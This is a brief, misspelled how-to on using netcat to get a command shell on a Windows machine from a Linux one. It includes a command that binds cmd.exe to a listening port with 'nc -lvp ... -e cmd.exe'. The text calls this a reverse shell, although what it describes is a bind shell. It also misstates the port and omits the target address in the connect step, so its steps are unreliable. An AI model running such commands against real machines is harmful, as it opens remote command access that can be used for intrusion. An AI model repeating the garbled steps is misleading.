HOW TO REVERSE SHEEL WINDOWS AND LINUX MACHINE USING NETCAT

Install netcat in both Linux and Windows system. For linux, run “ sudo apt-get install netcat” in the terminal. For Windows, you can use this link to download netcat . Move the nc.exe file to your desktop to access it easily. Steps to reverse shell windows in linux terminal.

  • Open command prompt in windows
  • navigate to Desktop (cd Desktop) then run this command “nc -lvp port-to-use -e cmd.exe” This opens port 80 and listens for incoming connections.
And boom you have a reverse shell of your windows machine in your linux machine. Now you can run commands in windows while in your linux machine. This can also be done using secure shell SSh 2. On the linux side, open the terminal and run “ nc port ” . To get the ip address for the windows machine, you can run “ipconfig” in cmd.
